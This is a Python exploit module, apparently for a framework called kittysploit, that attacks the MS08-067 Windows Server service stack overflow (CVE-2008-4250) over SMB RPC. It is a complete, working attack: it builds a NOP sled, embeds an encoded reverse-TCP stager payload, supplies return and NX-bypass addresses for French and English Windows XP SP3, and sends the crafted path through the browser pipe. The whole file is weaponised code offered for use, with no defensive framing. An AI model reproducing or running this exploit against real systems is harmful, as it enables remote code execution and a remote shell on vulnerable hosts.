from kittysploit import *

from impacket import smb
from impacket import uuid
from impacket.dcerpc.v5 import transport
import socket

class Module(Exploit):
	
	
	__info__ = {
		"name": "MS08-067 Microsoft Server Service Relative Path Stack Corruption",
		"description": "The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, "\
      					"Server 2003 SP1 and SP2, Vista Gold and SP1, Server 2008, and 7 Pre-Beta "\
               			"allows remote attackers to execute arbitrary code via a crafted RPC request "\
                  		"that triggers the overflow during path canonicalization, as exploited in the wild by Gimmiv."\
                        "A in October 2008, aka 'Server Service Vulnerability.'",
		"cve": "2008-4250",
		"payload" : {
			"platform": Platform.WINDOWS,
			"arch": Arch.X86,
			"badchars": "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40",
			"category": Payload_category.STAGER,
			},
		"version": {
			"Windows XP SP3 French (NX)": {
									"port": 445,
									"ret": b"\x07\xf8\x5b\x59", # 0x59 5b f8 07
									"disable_nx": b"\xc2\x17\x5c\x59",  # 0x59 5c 17 c2
			},
			"Windows XP SP3 English (NX)": {
									"port":445,
									"ret": b"\x07\xf8\x88\x6f", # 0x6f 88 f8 07
									"disable_nx": b"\xc2\x17\x89\x6f"  # 0x6f 89 17 c2
			},

		},
		"version_default": 0
	}

	target = OptString("127.0.0.1", "target", "yes")

	def default_options(self):
		options = {}
		options['payload'] = 'payloads/stagers/windows/x86/reverse_tcp'
		options['encoder'] = 'encoders/x86/call4_dword_xor'
		return options

	def run(self):
	
		num_nops = 410 - len(self.payload)
		payload = b"\x90" * num_nops

		payload += self.payload  # Add NOPS to the front

		jumper = b"\x08\x04\x02\x00"+ b"\xc2\x17\x5c\x59" + b"A" * 4 + b"\x07\xf8\x5b\x59" + b"A" * 42 + b"\x90" * 8 + b"\xeb\x62" + b"A" * 10

		print_status("Initiating connection")
		self.dcerpct = transport.DCERPCTransportFactory("ncacn_np:%s[\\pipe\\browser]" % self.target)
		
		try:
			self.dcerpct.connect()
		except socket.error as msg:
			print_error(msg)
			fail.NotVulnerable
   
		print_status(f'connected to ncacn_np:{self.target}[\\pipe\\browser]')
		self.__dce = self.dcerpct.DCERPC_class(self.dcerpct)
		self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
		path = b"\x5c\x00"
		path += b"ABCDEFGHIJ" * 10 
		path += payload
		path += b"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00"
		path += b"\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00"
		path += jumper 
		path += b"\x00" * 2

		server = b"\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
		prefix = b"\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
		
		MaxCount = b"\x36\x01\x00\x00"
		Offset = b"\x00\x00\x00\x00"
		ActualCount = b"\x36\x01\x00\x00"
		self.final_packet = server + MaxCount + Offset + ActualCount + path + b"\xE8\x03\x00\x00" + prefix + b"\x01\x10\x00\x00\x00\x00\x00\x00"        
		self.__dce.call(0x1f, self.final_packet)
		print_status("Done")

